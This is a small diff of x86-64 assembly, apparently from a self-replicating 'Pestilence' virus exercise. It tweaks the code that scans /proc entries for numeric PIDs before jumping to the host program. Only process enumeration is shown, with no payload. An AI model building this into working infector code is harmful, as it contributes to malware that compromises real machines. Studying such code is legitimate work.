@@ -115,7 +115,6 @@ section .text
         jle .jump_to_host
         mov VAR(Pestilence.fd_proc), rax
 
-    ;    CALL taeiou, 0x1e
     .dirent_proc:
          ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
         mov rdi, VAR(Pestilence.fd_proc)
@@ -146,7 +145,7 @@ section .text
         jne .check_dir_in_proc
 
         ; comprobamos que el nombre del directorio se corresponde con un PID
-        CALL directory_name_isdigit, 0x1e
+        CALL directory_name_isdigit, 0x20
         cmp al, 0
 
         jne .check_dir_in_proc
